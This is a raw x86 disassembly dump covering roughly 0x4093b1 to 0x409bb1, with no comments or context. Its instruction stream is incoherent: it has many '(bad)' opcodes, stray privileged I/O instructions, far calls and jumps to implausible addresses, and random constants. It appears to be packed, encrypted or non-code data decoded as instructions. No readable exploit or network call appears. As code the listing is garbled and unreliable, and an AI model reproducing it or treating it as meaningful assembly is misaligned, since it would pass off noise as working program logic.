  4093b1:	cmp    esp,DWORD PTR [edi]
  4093b3:	mov    ebx,eax
  4093b5:	adc    eax,0x7ac89234
  4093ba:	mov    ds:0x2bf13917,al
  4093bf:	sub    BYTE PTR [esi+eax*2+0x69e087c],al
  4093c6:	push   es
  4093c7:	cld    
  4093c8:	daa    
  4093c9:	jb     0x409428
  4093cb:	add    cl,bl
  4093cd:	jo     0x40942f
  4093cf:	imul   DWORD PTR [edx+esi*1+0x4b]
  4093d3:	mov    bl,0x23
  4093d5:	test   DWORD PTR [ebx],esp
  4093d7:	push   es
  4093d8:	test   BYTE PTR [edi+0x357dc156],ch
  4093de:	fs inc esi
  4093e0:	(bad)  
  4093e1:	out    dx,eax
  4093e2:	pop    ebx
  4093e3:	pop    esp
  4093e4:	enter  0xbedc,0x54
  4093e8:	mov    esi,0x5b150f22
  4093ed:	jl     0x409379
  4093ef:	mov    ah,0x50
  4093f1:	lahf   
  4093f2:	aaa    
  4093f3:	repnz mov ch,0x57
  4093f6:	test   DWORD PTR [edx-0x79],ebp
  4093f9:	mov    edx,0x8c6c21a1
  4093fe:	rol    BYTE PTR [ecx-0x62],cl
  409401:	inc    esp
  409402:	jno    0x409394
  409404:	lods   al,BYTE PTR ds:[esi]
  409405:	jbe    0x4093c1
  409407:	retf   0x33f4
  40940a:	cdq    
  40940b:	jle    0x40947f
  40940d:	pop    esp
  40940e:	dec    ebp
  40940f:	repnz xor DWORD PTR [ecx-0x2b7996a0],esi
  409416:	dec    eax
  409417:	sub    BYTE PTR [esi],ch
  409419:	dec    ebp
  40941a:	pop    ss
  40941b:	cld    
  40941c:	int    0xcb
  40941e:	(bad)  
  40941f:	adc    al,0x28
  409421:	sub    ecx,esp
  409423:	push   esp
  409424:	ins    DWORD PTR es:[edi],dx
  409425:	idiv   DWORD PTR [edx]
  409427:	ins    DWORD PTR es:[edi],dx
  409428:	push   cs
  409429:	inc    eax
  40942a:	xor    BYTE PTR [ebp+eiz*2-0x70],0x7a
  40942f:	or     eax,0xdf8ba896
  409434:	jb     0x409493
  409436:	mov    cl,0x74
  409438:	cmp    ah,bh
  40943a:	xchg   ebp,eax
  40943b:	xchg   esp,eax
  40943c:	dec    esp
  40943d:	fs mov esi,ebp
  409440:	bound  eax,QWORD PTR [edx+0x4e6ff86e]
  409446:	and    DWORD PTR [ebx-0x68],edi
  409449:	xor    BYTE PTR [ebx+esi*8-0x4fc523a8],al
  409450:	pushf  
  409451:	lea    edx,[eax+0x12f76d09]
  409457:	jmp    0x40942e
  409459:	stc    
  40945a:	jmp    0x9b0901d0
  40945f:	ds loopne 0x4093f4
  409462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409463:	push   eax
  409464:	jecxz  0x409459
  409466:	in     eax,0x45
  409468:	dec    ecx
  409469:	and    DWORD PTR [esp+ebp*2-0x112a68a],esp
  409470:	shl    al,0xa3
  409473:	aas    
  409474:	adc    dh,al
  409476:	aam    0xa3
  409478:	cwde   
  409479:	cdq    
  40947a:	out    dx,al
  40947b:	adc    eax,0x1d957d3b
  409480:	pop    edi
  409481:	mov    esi,0x90a4ffe0
  409486:	ja     0x4094a3
  409488:	or     BYTE PTR [edi+0x1d],dh
  40948b:	xchg   DWORD PTR [eax-0x7eea18e2],edi
  409491:	xchg   ebp,eax
  409492:	mov    edi,0x316b2062
  409497:	adc    eax,0xab3d99d6
  40949c:	mov    cl,0x41
  40949e:	scas   eax,DWORD PTR es:[edi]
  40949f:	xchg   esp,eax
  4094a0:	dec    esi
  4094a1:	pop    ds
  4094a2:	test   DWORD PTR [edx-0x953a240],edi
  4094a8:	(bad)  
  4094a9:	int3   
  4094aa:	pop    ecx
  4094ab:	ds dec ebp
  4094ad:	stos   BYTE PTR es:[edi],al
  4094ae:	dec    edi
  4094af:	scas   al,BYTE PTR es:[edi]
  4094b0:	ds cld 
  4094b2:	or     eax,0xc2d3d19b
  4094b7:	leave  
  4094b8:	pop    esi
  4094b9:	mov    cl,0x83
  4094bb:	ins    DWORD PTR es:[edi],dx
  4094bc:	inc    edx
  4094bd:	xor    ah,bl
  4094bf:	mov    esp,0x964f95b
  4094c4:	jmp    0x2a237522
  4094c9:	sti    
  4094ca:	ins    DWORD PTR es:[edi],dx
  4094cb:	cmp    al,0x2a
  4094cd:	push   ds
  4094ce:	repnz push esi
  4094d0:	les    edx,FWORD PTR [edi]
  4094d2:	das    
  4094d3:	mov    esi,0xa570e68c
  4094d8:	daa    
  4094d9:	rcr    BYTE PTR [edx],1
  4094db:	mov    ecx,0xf451a192
  4094e0:	adc    ebx,esi
  4094e2:	mov    al,ds:0x91c62c9
  4094e7:	pop    esi
  4094e8:	lock nop
  4094ea:	cmp    ah,ch
  4094ec:	and    bh,bh
  4094ee:	(bad)  
  4094f0:	mov    esp,0x3e53de45
  4094f5:	je     0x409555
  4094f7:	and    al,0x75
  4094f9:	jns    0x40952b
  4094fb:	sar    ch,1
  4094fd:	add    BYTE PTR [edi],cl
  4094ff:	bound  ebx,QWORD PTR [ecx+0x2f]
  409502:	mov    esi,0xf8a9d6f3
  409507:	sub    eax,0x64327e80
  40950c:	idiv   DWORD PTR [ebx+edx*4]
  40950f:	mov    ds:0xb0888087,eax
  409514:	mov    bl,0x98
  409516:	js     0x409592
  409518:	dec    ecx
  409519:	repz popf 
  40951b:	imul   esi,DWORD PTR [esi+0x3a],0xffffff89
  40951f:	icebp  
  409520:	popa   
  409521:	dec    eax
  409522:	int3   
  409523:	mov    esi,0x7d77f224
  409528:	popf   
  409529:	adc    DWORD PTR [edx-0x3921a8d4],edi
  40952f:	pop    edi
  409530:	call   0x8f0e6c5d
  409535:	pop    eax
  409536:	mov    ds:0x367b985c,eax
  40953b:	fcom   DWORD PTR [ebx-0x468d5e76]
  409541:	repnz inc ebx
  409543:	mov    ch,0x41
  409545:	pop    ss
  409546:	rcl    BYTE PTR [esp+esi*2+0x4968217e],cl
  40954d:	pushf  
  40954e:	fwait
  40954f:	xlat   BYTE PTR ds:[ebx]
  409550:	add    DWORD PTR [ecx+eax*8+0x4b9251f2],edx
  409557:	adc    al,0x6e
  409559:	mov    ebx,0xf8e74858
  40955e:	lods   eax,DWORD PTR ds:[esi]
  40955f:	ins    DWORD PTR es:[edi],dx
  409560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409561:	or     BYTE PTR [esi],ch
  409563:	xor    DWORD PTR [edx+0x59],ebx
  409566:	mov    esi,0xfb0e2fee
  40956b:	lock pop esp
  40956d:	aaa    
  40956e:	sti    
  40956f:	xchg   ecx,eax
  409570:	xchg   ebx,eax
  409571:	iret   
  409572:	or     BYTE PTR [eax],dl
  409574:	repz leave 
  409576:	loopne 0x409596
  409578:	call   0xb073:0x9550ab55
  40957f:	and    bl,BYTE PTR [edx+0x16]
  409582:	cmc    
  409583:	mov    ds:0xa63a1e4c,al
  409588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409589:	adc    ebx,DWORD PTR [ebx]
  40958b:	mov    edi,0x959ae281
  409590:	add    esi,DWORD PTR [esi]
  409592:	jmp    0x409546
  409594:	bound  esp,QWORD PTR [ecx-0x7bc5545]
  40959a:	mul    DWORD PTR [ebp+0x31f169ba]
  4095a0:	lahf   
  4095a1:	jo     0x409579
  4095a3:	jmp    0x409551
  4095a5:	xor    dh,ah
  4095a7:	sub    ch,BYTE PTR [esi+0x726eabc]
  4095ad:	test   BYTE PTR [ecx-0x5d],0xef
  4095b1:	arpl   WORD PTR [edx],cx
  4095b3:	mov    eax,ds:0x7664ea55
  4095b8:	je     0x409560
  4095ba:	stos   DWORD PTR es:[edi],eax
  4095bb:	xchg   ecx,eax
  4095bc:	loopne 0x4095bd
  4095be:	dec    edi
  4095bf:	xchg   edi,eax
  4095c0:	pop    ecx
  4095c1:	push   cs
  4095c2:	and    DWORD PTR [ebx],eax
  4095c4:	xchg   edi,eax
  4095c5:	lods   eax,DWORD PTR ds:[esi]
  4095c6:	out    0xdf,eax
  4095c8:	xor    BYTE PTR [edi+0x73c0d804],bl
  4095ce:	lods   al,BYTE PTR ds:[esi]
  4095cf:	sub    al,BYTE PTR [edx-0x642cbfec]
  4095d5:	lods   al,BYTE PTR ds:[esi]
  4095d6:	loop   0x409589
  4095d8:	sub    eax,0xccea97f2
  4095dd:	dec    edi
  4095de:	and    bh,bh
  4095e0:	pop    esi
  4095e1:	loope  0x40963f
  4095e3:	hlt    
  4095e4:	push   ebx
  4095e5:	dec    edi
  4095e6:	mov    esi,DWORD PTR [edx]
  4095e8:	in     ax,0xf0
  4095eb:	stos   BYTE PTR es:[edi],al
  4095ec:	add    al,0x41
  4095ee:	sbb    al,0x91
  4095f0:	or     eax,0x4605c58b
  4095f5:	dec    esi
  4095f6:	(bad)  
  4095f7:	out    dx,al
  4095f8:	jecxz  0x40961b
  4095fa:	push   eax
  4095fb:	inc    esi
  4095fc:	fcom   QWORD PTR [ebx]
  4095fe:	add    DWORD PTR [eax-0x20624bb],0xffffffd0
  409605:	xlat   BYTE PTR ds:[ebx]
  409606:	ja     0x409611
  409608:	mov    ch,0x96
  40960a:	mov    eax,DWORD PTR [edi+0x4bc0decd]
  409610:	mov    edx,0x750099a0
  409615:	jae    0x40964c
  409617:	cdq    
  409618:	clc    
  409619:	mov    ch,0xdf
  40961b:	imul   esi,esi,0x71c686bb
  409621:	mov    dh,0x6d
  409623:	push   ecx
  409624:	dec    ebp
  409625:	adc    BYTE PTR [esi-0x55],bl
  409628:	xchg   ebx,eax
  409629:	mov    al,ds:0x6b192972
  40962e:	retf   
  40962f:	cmp    edx,0x6f088730
  409635:	pop    ebx
  409636:	cmp    bh,BYTE PTR [ebx+0x631da097]
  40963c:	mov    edi,0x9ac4bdb0
  409641:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  409643:	push   0xffffffdc
  409645:	adc    edi,DWORD PTR [edi+0x1f]
  409648:	jae    0x40969e
  40964a:	xchg   DWORD PTR [edi],esp
  40964c:	xor    BYTE PTR [ecx-0x34],ch
  40964f:	adc    al,0x5
  409651:	push   ebp
  409652:	push   0x7ca92f2c
  409657:	cmp    DWORD PTR [edx-0x45fb3df0],ebx
  40965d:	mov    DWORD PTR [ebp+0x50e51e22],esp
  409663:	daa    
  409664:	jns    0x409623
  409666:	imul   esp,DWORD PTR [esi],0x31ccfeaa
  40966c:	cld    
  40966d:	loopne 0x4095f8
  40966f:	nop
  409670:	mov    bh,0xf1
  409672:	mov    bl,0xb3
  409674:	mov    WORD PTR [ebx],?
  409676:	dec    edx
  409677:	jne    0x40968c
  409679:	xchg   ebp,eax
  40967a:	into   
  40967b:	xor    BYTE PTR [esi],dl
  40967d:	jge    0x4096ec
  40967f:	mov    edi,DWORD PTR [eax+ebp*8+0x68f160d9]
  409686:	and    DWORD PTR [edx+0x2f52c32d],esp
  40968c:	dec    eax
  40968d:	xchg   BYTE PTR [ecx+0xd],bh
  409690:	lods   eax,DWORD PTR ds:[esi]
  409691:	inc    esi
  409692:	adc    eax,0x51cc6403
  409697:	sbb    bl,BYTE PTR [esi]
  409699:	test   BYTE PTR [edi+0x22e8f697],dh
  40969f:	and    DWORD PTR [edx-0x3d6361d0],ebp
  4096a5:	xor    eax,0xa0d2d8fc
  4096aa:	aam    0xa2
  4096ac:	cmp    ebx,DWORD PTR [ebx+esi*8]
  4096af:	push   ebp
  4096b0:	add    eax,0xf17b7ea5
  4096b5:	jns    0x4096dc
  4096b7:	adc    DWORD PTR [edi-0x64],edx
  4096ba:	cld    
  4096bb:	ins    BYTE PTR es:[edi],dx
  4096bc:	jae    0x4096b6
  4096be:	inc    edx
  4096bf:	xor    BYTE PTR [esi],bh
  4096c1:	push   0xabb79eda
  4096c6:	pop    esp
  4096c7:	pop    ebx
  4096c8:	jbe    0x40965b
  4096ca:	sbb    BYTE PTR [ebp+eiz*1+0x2062c8a0],ch
  4096d1:	ficom  WORD PTR ds:0xafa04849
  4096d7:	into   
  4096d8:	jp     0x409711
  4096da:	add    eax,DWORD PTR [ebx-0x19]
  4096dd:	retf   0xc834
  4096e0:	xchg   ebx,eax
  4096e1:	lahf   
  4096e2:	push   edx
  4096e3:	repnz bound ebx,QWORD PTR [eax-0x5db5ca94]
  4096ea:	cli    
  4096eb:	int3   
  4096ec:	scas   al,BYTE PTR es:[edi]
  4096ed:	int3   
  4096ee:	loop   0x409728
  4096f0:	(bad)  
  4096f1:	dec    ebx
  4096f2:	dec    edi
  4096f3:	call   0xead7393e
  4096f8:	dec    ecx
  4096f9:	push   ebp
  4096fa:	jb     0x4096c7
  4096fc:	rcl    DWORD PTR [eax-0x758bc98],1
  409702:	sahf   
  409703:	(bad)  [eax+0x22af6846]
  409709:	inc    esp
  40970a:	ins    BYTE PTR es:[edi],dx
  40970b:	xchg   edx,eax
  40970c:	fsub   QWORD PTR [ebp+0x22d6b5bd]
  409712:	push   ebx
  409713:	and    al,0xc3
  409715:	ins    DWORD PTR es:[edi],dx
  409716:	xchg   ebx,eax
  409717:	ror    eax,cl
  409719:	test   eax,0x821e1996
  40971e:	add    DWORD PTR [ebx+0x11],ebp
  409721:	ja     0x4096eb
  409723:	iret   
  409724:	lock retf 0x8afe
  409728:	test   al,0x20
  40972a:	shr    BYTE PTR [esi],0xfc
  40972d:	pop    ebx
  40972e:	ja     0x4096bd
  409730:	push   ebp
  409731:	lds    edi,FWORD PTR [ebx-0x6c]
  409734:	sar    DWORD PTR [ecx],1
  409736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409737:	dec    ecx
  409738:	inc    esp
  409739:	lahf   
  40973a:	jo     0x4096f3
  40973c:	fdiv   QWORD PTR [ebx]
  40973e:	or     al,0x7b
  409740:	jb     0x4097b1
  409742:	ss pop ecx
  409744:	je     0x40971f
  409746:	imul   ebp,DWORD PTR [esi+0x4e52d45b],0xffffff81
  40974d:	sub    eax,0x793eb3ef
  409752:	inc    ebx
  409753:	dec    edx
  409754:	push   cs
  409755:	js     0x4097ae
  409757:	jbe    0x40978e
  409759:	movaps xmm7,xmm3
  40975c:	xor    ebp,DWORD PTR [edx-0x5478596]
  409762:	add    DWORD PTR [edi],0xffffff86
  409765:	outs   dx,DWORD PTR ds:[esi]
  409766:	push   ss
  409767:	mov    eax,ds:0x33e3db4b
  40976c:	add    ah,BYTE PTR [ebp+ebx*1+0x46]
  409770:	nop
  409771:	test   DWORD PTR [eax+0x793f48aa],edi
  409777:	mov    al,BYTE PTR [ebx-0x7e0c2be]
  40977d:	xor    eax,0xc8f927c3
  409782:	and    esp,ebp
  409784:	cld    
  409785:	add    eax,0xf81c15e2
  40978a:	fwait
  40978b:	mov    edx,0xe631b559
  409790:	xchg   DWORD PTR [ecx-0x29],eax
  409793:	mov    ecx,0x826a8082
  409798:	sub    eax,0xa6b82e52
  40979d:	mov    eax,ds:0x49027608
  4097a2:	scas   al,BYTE PTR es:[edi]
  4097a3:	daa    
  4097a4:	jg     0x40980b
  4097a6:	xor    ch,BYTE PTR [eax+0x29cc54e4]
  4097ac:	pop    esp
  4097ad:	jns    0x409748
  4097af:	jl     0x4097c8
  4097b1:	and    BYTE PTR [edx],bh
  4097b3:	mov    ds:0x39d654aa,al
  4097b8:	shl    DWORD PTR [ecx-0x49fab912],0x47
  4097bf:	(bad)  
  4097c1:	xchg   ecx,eax
  4097c2:	fst    DWORD PTR [ebx+0x7b]
  4097c5:	sub    al,0x38
  4097c7:	imul   esp,ebx,0xbb74be20
  4097cd:	mov    dh,0x6d
  4097cf:	xor    DWORD PTR ds:0xb4dd8fe3,ebx
  4097d5:	mov    edx,DWORD PTR [eax+eax*1]
  4097d8:	jne    0x4097a4
  4097da:	xchg   esp,eax
  4097db:	and    BYTE PTR [eax+0x7731155f],0xc2
  4097e2:	test   eax,0x862c469c
  4097e7:	repz inc ecx
  4097e9:	add    eax,0x9a474205
  4097ee:	mov    es,esp
  4097f0:	mov    ds:0xc2d0c3d2,al
  4097f5:	add    DWORD PTR [edx+0x16a19458],esi
  4097fb:	jmp    0x40985f
  4097fd:	int    0x67
  4097ff:	mov    WORD PTR [ebx+eiz*2],ds
  409802:	xlat   BYTE PTR ds:[ebx]
  409803:	add    ah,cl
  409805:	les    edx,FWORD PTR [eax+0x16]
  409808:	mov    DWORD PTR [eax+0x169e1d82],edx
  40980e:	pop    edx
  40980f:	retf   
  409810:	sbb    eax,0x5e9becb9
  409815:	imul   esi,eax,0x2fb5cfd7
  40981b:	les    esp,FWORD PTR ds:0xf5c481b4
  409821:	fs or  eax,0xc4731cb
  409827:	mov    ds:0x9d0b809a,al
  40982c:	jl     0x4097d8
  40982e:	jl     0x40989c
  409830:	or     ecx,DWORD PTR [ebp+0x10]
  409833:	mov    edi,0x9eef1f21
  409838:	sub    al,0x37
  40983a:	imul   DWORD PTR [ebx+0x1bae72dc]
  409840:	sub    ecx,DWORD PTR [edi]
  409842:	adc    eax,0x57fd0fb3
  409847:	xchg   edx,eax
  409848:	aaa    
  409849:	inc    ecx
  40984a:	fstp   DWORD PTR [edx]
  40984c:	stos   BYTE PTR es:[edi],al
  40984d:	push   ebp
  40984e:	test   eax,0x109a36b2
  409853:	popa   
  409854:	pop    ss
  409855:	pop    edi
  409856:	rcl    BYTE PTR ds:0xc3798bde,0x53
  40985d:	(bad)  
  40985e:	xchg   edi,eax
  40985f:	fs stc 
  409861:	ret    0xff8d
  409864:	xlat   BYTE PTR ds:[ebx]
  409865:	test   al,0x3e
  409867:	(bad)  
  409868:	jl     0x409880
  40986a:	push   edx
  40986b:	sbb    DWORD PTR [ebx+0x6db96281],0x7f9fdefe
  409875:	jns    0x40983a
  409877:	mov    cl,0x32
  409879:	jne    0x40983d
  40987b:	lahf   
  40987c:	call   0x9c059511
  409881:	dec    BYTE PTR [ecx]
  409883:	add    eax,DWORD PTR [ecx]
  409885:	sbb    al,0x2d
  409887:	fwait
  409888:	jbe    0x4098c4
  40988a:	mov    WORD PTR [esi+0x2],ds
  40988d:	mov    ebx,0x2e2c04da
  409892:	mov    eax,?
  409894:	mov    ebp,0x1ff98423
  409899:	xor    BYTE PTR [eax],0xca
  40989c:	pop    es
  40989d:	ja     0x4098d5
  40989f:	push   0x3a5e500a
  4098a4:	std    
  4098a5:	cmp    al,0xc9
  4098a7:	repnz inc edx
  4098a9:	or     esp,DWORD PTR [ecx*8+0x57c55eed]
  4098b0:	push   0x8d48db34
  4098b5:	fdivr  DWORD PTR [eax]
  4098b7:	out    0x8c,al
  4098b9:	loope  0x40991c
  4098bb:	hlt    
  4098bc:	pop    ds
  4098bd:	sti    
  4098be:	push   edx
  4098bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098c0:	fs test DWORD PTR ss:[esi],ebp
  4098c4:	cld    
  4098c5:	fnstcw WORD PTR [ebp-0x36a2361d]
  4098cb:	cmp    ebx,esi
  4098cd:	in     al,dx
  4098ce:	xor    bl,dl
  4098d0:	sub    ch,BYTE PTR [edx-0x44c73af7]
  4098d6:	popf   
  4098d7:	aad    0x4d
  4098d9:	xor    al,0x32
  4098db:	pop    es
  4098dc:	mov    edx,0x5da525fd
  4098e1:	dec    esp
  4098e2:	jb     0x409889
  4098e4:	and    eax,0xc2c78c5d
  4098e9:	sub    DWORD PTR es:[edi-0x62],esi
  4098ed:	jbe    0x409962
  4098ef:	mov    esi,0x6327507b
  4098f4:	cs mov edx,0xf4bd85ac
  4098fa:	mov    edx,0x3601ac4b
  4098ff:	or     edx,esi
  409901:	imul   edi,edx,0xfa45e7a8
  409907:	jno    0x4098a8
  409909:	adc    al,0xde
  40990b:	dec    esp
  40990c:	xchg   edi,eax
  40990d:	fsubr  DWORD PTR [ebx]
  40990f:	mov    edi,0xa0c7c5cf
  409914:	or     DWORD PTR [ecx-0x473249e0],edi
  40991a:	pop    edx
  40991b:	test   eax,0x3e6d9b05
  409920:	jl     0x4098e9
  409922:	dec    eax
  409923:	out    0xd9,eax
  409925:	pop    ecx
  409926:	xchg   edi,eax
  409927:	dec    ebp
  409928:	into   
  409929:	loope  0x409915
  40992b:	mov    bh,0xf0
  40992d:	mov    al,dl
  40992f:	dec    ecx
  409930:	add    eax,0x769643a8
  409936:	stc    
  409937:	loope  0x409922
  409939:	jae    0x409992
  40993b:	dec    edi
  40993c:	data16 test al,0xcf
  40993f:	jno    0x409972
  409941:	repnz add BYTE PTR [ebp+edx*4-0x73],bh
  409946:	mov    DWORD PTR [edx-0x2f3ab310],ebp
  40994c:	stc    
  40994d:	push   es
  40994e:	ret    0xea76
  409951:	retf   0x84e3
  409954:	not    eax
  409956:	mov    dl,0x2d
  409958:	dec    esp
  409959:	and    al,BYTE PTR [ecx+esi*4]
  40995c:	add    esp,DWORD PTR [esi-0x256bc46f]
  409962:	pop    esi
  409963:	lock mov al,0x28
  409966:	sar    DWORD PTR [esi+0x5b],cl
  409969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40996a:	in     eax,dx
  40996b:	xor    ch,BYTE PTR [ecx]
  40996d:	lods   eax,DWORD PTR ds:[esi]
  40996e:	ins    BYTE PTR es:[edi],dx
  40996f:	inc    esp
  409970:	icebp  
  409971:	pop    ss
  409972:	xchg   edi,eax
  409973:	push   edx
  409974:	sbb    bh,cl
  409976:	or     DWORD PTR [ecx],eax
  409978:	test   BYTE PTR [edi-0x18f68ccd],cl
  40997e:	xor    al,0x21
  409980:	inc    esp
  409981:	ret    0x7ace
  409984:	arpl   WORD PTR [edi-0x253255aa],sp
  40998a:	loop   0x409968
  40998c:	inc    edx
  40998d:	xor    ecx,ebp
  40998f:	pop    ebx
  409990:	xchg   ebp,eax
  409991:	(bad)  
  409992:	leave  
  409993:	sbb    BYTE PTR [edi+0x71bbe325],dh
  409999:	jg     0x4099f5
  40999b:	scas   al,BYTE PTR es:[edi]
  40999c:	jg     0x40999c
  40999e:	pop    ebp
  40999f:	xor    al,0x7d
  4099a1:	add    ah,al
  4099a3:	or     al,0x30
  4099a5:	popa   
  4099a6:	data16 jmp 0x4099aa
  4099a9:	test   DWORD PTR [eax+0x47],edx
  4099ac:	int    0xe0
  4099ae:	hlt    
  4099af:	pop    ss
  4099b0:	inc    eax
  4099b1:	mov    dl,BYTE PTR [ebx]
  4099b3:	test   DWORD PTR [ecx],edi
  4099b5:	shl    DWORD PTR ss:[eax],0x9b
  4099b9:	push   0x3268cf36
  4099be:	jmp    0x409a28
  4099c0:	gs mov ebp,0x6a80991d
  4099c6:	aas    
  4099c7:	in     al,0x3c
  4099c9:	xchg   ebp,eax
  4099ca:	or     eax,DWORD PTR [esi-0x25]
  4099cd:	jp     0x409996
  4099cf:	out    0x27,ax
  4099d2:	sahf   
  4099d3:	xchg   esi,eax
  4099d4:	rol    al,0xe3
  4099d7:	(bad)  
  4099d9:	and    BYTE PTR [edx+0xe],ah
  4099dc:	retf   0x4dfe
  4099df:	mov    ds:0xa239f960,al
  4099e4:	dec    ebp
  4099e5:	mov    eax,ds:0xcd11eb35
  4099ea:	inc    ebp
  4099eb:	jle    0x4099c1
  4099ed:	push   ecx
  4099ee:	scas   al,BYTE PTR es:[edi]
  4099ef:	(bad)
  4099f4:	dec    esi
  4099f5:	mov    dh,0xae
  4099f7:	mov    ch,0xa
  4099f9:	mov    ebx,esi
  4099fb:	call   0x9951:0x444be680
  409a02:	dec    ebp
  409a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a04:	pop    ebx
  409a05:	loop   0x409a53
  409a07:	mov    cl,0x70
  409a09:	push   edi
  409a0a:	repnz add ebp,DWORD PTR ds:0x85711175
  409a11:	xchg   ecx,eax
  409a12:	jae    0x4099c3
  409a14:	ins    BYTE PTR es:[edi],dx
  409a15:	or     eax,0x4b4a3a3c
  409a1a:	jecxz  0x4099cf
  409a1c:	fnstcw WORD PTR [ebp-0x3eaaf26f]
  409a22:	scas   eax,DWORD PTR es:[edi]
  409a23:	shr    DWORD PTR [ebx],1
  409a25:	sti    
  409a26:	mov    edi,DWORD PTR [si-0x77]
  409a2a:	add    al,0x39
  409a2c:	pop    edi
  409a2d:	retf   0x6c77
  409a30:	or     DWORD PTR [eax-0x3e],ecx
  409a33:	add    al,0xfa
  409a35:	cld    
  409a36:	push   esp
  409a37:	dec    esi
  409a38:	adc    eax,0x446b421a
  409a3d:	sti    
  409a3e:	dec    edx
  409a3f:	xchg   ebp,eax
  409a40:	cmp    cl,al
  409a42:	retf   
  409a43:	xor    BYTE PTR [ecx-0x48],ah
  409a46:	mov    edx,0xa579b5f8
  409a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a4c:	push   DWORD PTR [edi+eiz*1+0x702bcaa5]
  409a53:	add    edx,edx
  409a55:	jmp    0x4901:0x177adf92
  409a5c:	(bad)  cs:[edi-0x17bae473]
  409a63:	dec    edi
  409a64:	test   eax,0x8f826b6f
  409a69:	sbb    al,0x26
  409a6b:	jne    0x409aae
  409a6d:	adc    eax,0x80052661
  409a72:	xor    ecx,eax
  409a74:	xchg   ecx,eax
  409a75:	imul   BYTE PTR [ebx-0x7c6baa4a]
  409a7b:	mov    fs,esp
  409a7d:	and    BYTE PTR [eax+0x71d4142c],dl
  409a83:	ror    ebp,cl
  409a85:	test   al,0xcc
  409a87:	push   ds
  409a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a89:	mov    edx,?
  409a8b:	mov    dl,0xd9
  409a8d:	imul   ebx,DWORD PTR [esi],0xffffffb5
  409a90:	lods   al,BYTE PTR ds:[esi]
  409a91:	inc    edi
  409a92:	or     al,0x0
  409a94:	lock fs pop eax
  409a97:	stc    
  409a98:	scas   al,BYTE PTR es:[edi]
  409a99:	mov    al,ds:0x58b5fddf
  409a9e:	push   edx
  409a9f:	mov    ecx,0xab79a04f
  409aa4:	add    eax,0x98870bc3
  409aa9:	mov    eax,ds:0x26830b4e
  409aae:	mov    dl,0xd2
  409ab0:	jnp    0x409a4f
  409ab2:	test   BYTE PTR [eax+0xcd5af69],0xd9
  409ab9:	pusha  
  409aba:	pop    ss
  409abb:	dec    esp
  409abc:	mov    BYTE PTR [esi],cl
  409abe:	xchg   esi,eax
  409abf:	or     eax,DWORD PTR [esi+0x575d6498]
  409ac5:	fild   DWORD PTR [esi]
  409ac7:	fldcw  WORD PTR ds:0x97274c90
  409acd:	test   BYTE PTR [ebx],0xe5
  409ad0:	out    0xa6,al
  409ad2:	cs je  0x409b16
  409ad5:	mov    bl,0xc1
  409ad7:	and    edi,0x1a
  409ada:	fwait
  409adb:	hlt    
  409adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409add:	cdq    
  409ade:	push   eax
  409adf:	popa   
  409ae0:	repnz xchg ebx,eax
  409ae2:	call   0x9f042a11
  409ae7:	(bad)  
  409ae8:	repz call 0x6efee394
  409aee:	fild   QWORD PTR [edx+eax*2]
  409af1:	popa   
  409af2:	je     0x409a9e
  409af4:	aas    
  409af5:	jmp    0x409b3d
  409af7:	std    
  409af8:	jnp    0x409a98
  409afa:	in     al,dx
  409afb:	or     DWORD PTR [eax+0x1de17bae],0xffffffcc
  409b02:	ror    DWORD PTR [edi+0x23],0x22
  409b06:	xor    eax,0x95c967d3
  409b0b:	xor    DWORD PTR [edx-0x33],esp
  409b0e:	add    BYTE PTR [eax+0x17],ah
  409b11:	sub    dl,bl
  409b13:	bound  esp,QWORD PTR [eax]
  409b15:	or     eax,0x8bd6237a
  409b1a:	not    BYTE PTR [eax+0x79]
  409b1d:	test   eax,0xb0c0d6f2
  409b22:	fsubr  DWORD PTR [edi-0x607fcb8b]
  409b28:	fbld   TBYTE PTR [esi-0x2d]
  409b2b:	aad    0x17
  409b2d:	or     eax,0x72e09b84
  409b32:	sub    ebx,esi
  409b34:	pop    DWORD PTR [edx+ebp*2-0x23]
  409b38:	lods   al,BYTE PTR ds:[esi]
  409b39:	imul   eax,DWORD PTR [ebp+ecx*2-0x7c6c470f],0xbedfaedc
  409b44:	mov    ss,WORD PTR [ecx+0x72418c93]
  409b4a:	mov    bl,0xdb
  409b4c:	scas   al,BYTE PTR es:[edi]
  409b4d:	das    
  409b4e:	clc    
  409b4f:	arpl   WORD PTR [ebx],ax
  409b51:	jmp    0x409bc7
  409b53:	mov    ecx,0x41c5420e
  409b58:	cld    
  409b59:	jno    0x409b34
  409b5b:	int3   
  409b5c:	lds    ecx,FWORD PTR [esi-0x13bac233]
  409b62:	iret   
  409b63:	in     eax,dx
  409b64:	leave  
  409b65:	jne    0x409ba0
  409b67:	xor    eax,0x260d1973
  409b6c:	(bad)  
  409b6d:	retf   0x42dc
  409b70:	push   cs
  409b71:	imul   edi,DWORD PTR [edi],0xffffffcc
  409b74:	cmp    eax,0xd6a8f4c8
  409b79:	shl    DWORD PTR [ecx+0x32],0x40
  409b7d:	jbe    0x409b2c
  409b7f:	push   ss
  409b80:	bound  ebp,QWORD PTR [edx]
  409b82:	pop    ebp
  409b83:	jg     0x409b66
  409b85:	jge    0x409b7b
  409b87:	cdq    
  409b88:	mov    edi,0xb59d1af0
  409b8d:	jp     0x409bc5
  409b8f:	cmc    
  409b90:	pop    ss
  409b91:	sub    ebx,edi
  409b93:	inc    ebp
  409b94:	dec    ebp
  409b95:	push   es
  409b96:	mov    ebx,0x7c830dc1
  409b9b:	mov    DWORD PTR [ecx+0x25],edi
  409b9e:	test   DWORD PTR [eax-0x2933de0c],ebp
  409ba4:	pop    ds
  409ba5:	cmp    al,0xdd
  409ba7:	sub    ah,ch
  409ba9:	dec    ecx
  409baa:	aaa    
  409bab:	daa    
  409bac:	(bad)  
  409bad:	pusha  
  409bae:	outs   dx,DWORD PTR ds:[esi]
  409baf:	bound  eax,QWORD PTR [esi]
  409bb1:	scas   al,BYTE PTR es:[edi]
